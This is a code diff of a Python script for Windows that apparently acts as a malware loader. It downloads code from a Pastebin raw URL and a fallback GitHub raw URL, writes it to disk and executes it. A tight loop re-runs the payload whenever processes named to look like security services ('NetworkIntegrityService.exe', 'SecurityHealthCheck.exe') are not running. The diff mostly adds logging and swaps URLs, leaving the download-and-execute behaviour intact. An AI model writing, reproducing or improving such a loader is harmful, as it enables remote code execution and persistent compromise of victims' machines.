@@ -5,22 +5,22 @@ import random
 import gzip
 import subprocess
 from io import BytesIO
-import pywintypes
-import ctypes
-import sys
-import shutil
 import win32api
-import win32con
 import win32event
-import win32clipboard
+import sys
+import logging
+
+logging.basicConfig(filename='service_monitor.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def create_mutex(mutex_name):
     try:
         mutex = win32event.CreateMutex(None, 0, mutex_name)
         if win32api.GetLastError() == 183:  
+            logging.info("Mutex already exists. Exiting.")
             return False
         return True
     except Exception as e:
+        logging.error(f"Failed to create mutex: {e}")
         return False
 
 if os.name == "nt":
@@ -51,25 +51,25 @@ def fetch_url_with_random_user_agent(raw_url, fallback_url):
     def fetch_url(url):
         try:
             req = urllib.request.Request(url, headers=headers)
-            response = urllib.request.urlopen(req)
-            if 'gzip' in response.headers.get('Content-Encoding', ''):
-                buf = BytesIO(response.read())
-                f = gzip.GzipFile(fileobj=buf)
-                return f.read().decode('utf-8')
-            else:
-                return response.read().decode('utf-8')
+            with urllib.request.urlopen(req) as response:
+                if 'gzip' in response.headers.get('Content-Encoding', ''):
+                    buf = BytesIO(response.read())
+                    f = gzip.GzipFile(fileobj=buf)
+                    return f.read().decode('utf-8')
+                else:
+                    return response.read().decode('utf-8')
         except urllib.error.HTTPError as e:
+            logging.error(f"HTTP error while fetching {url}: {e}")
             return None
         except Exception as e:
+            logging.error(f"Error while fetching {url}: {e}")
             return None
 
     raw_code = fetch_url(raw_url)
     
     if not raw_code:
-        try:
-            raw_code = fetch_url(fallback_url)
-        except Exception as e:
-            return None
+        logging.info(f"Fetching fallback URL: {fallback_url}")
+        raw_code = fetch_url(fallback_url)
     
     return raw_code
 
@@ -82,38 +82,41 @@ def write_and_execute(raw_code):
             with open(test_file_path, 'wb') as f:
                 f.write(raw_code)
             
-            subprocess.run([test_file_path], check=True)
+            logging.info(f"Executing {test_file_path}")
+            subprocess.Popen([test_file_path], shell=True)
         else:
-            pass
+            logging.warning("No raw code to write and execute.")
     except Exception as e:
-        pass
+        logging.error(f"Error in write_and_execute: {e}")
 
-raw_url = 'https://pastebin.com/raw/zUChGNjj'
-fallback_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/Midnight'
+raw_url = 'https://test'
+fallback_url = 'https://github.com/247msn/96737693845/raw/refs/heads/main/fetch'
 
 try:
     raw_code = fetch_url_with_random_user_agent(raw_url, fallback_url)
+    logging.info(f"Raw code fetched: {raw_code[:100]}...")  
 except Exception as e:
-    pass
+    logging.error(f"Error fetching raw code: {e}")
 
 def check_running():
     try:
-        process = subprocess.Popen(["tasklist", "/FI", "IMAGENAME eq NetworkIntegrityService.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, _ = process.communicate()
-        if b"NetworkIntegrityService.exe" not in output:
-            write_and_execute(raw_code)
-        
-        process = subprocess.Popen(["tasklist", "/FI", "IMAGENAME eq SecurityHealthCheck.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, _ = process.communicate()
-        if b"SecurityHealthCheck.exe" not in output:
-            write_and_execute(raw_code)
-
+        logging.info("Checking if processes are running.")
+        for process_name in ["NetworkIntegrityService.exe", "SecurityHealthCheck.exe"]:
+            output = subprocess.check_output(
+                ["tasklist", "/FI", f"IMAGENAME eq {process_name}"],
+                stderr=subprocess.PIPE,
+                shell=True  
+            )
+            logging.info(f"Tasklist output for {process_name}: {output.decode()}")
+            if bytes(process_name, 'utf-8') not in output:
+                logging.info(f"{process_name} is not running. Attempting to execute raw code.")
+                write_and_execute(raw_code)
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Error running tasklist: {e}")
     except Exception as e:
-        pass
+        logging.error(f"An error occurred in check_running: {e}")
 
 while True:
-    try:
-        check_running()
-    except Exception as e:
-        pass
+    check_running()
+    print("Checked Running")
     time.sleep(0.1)
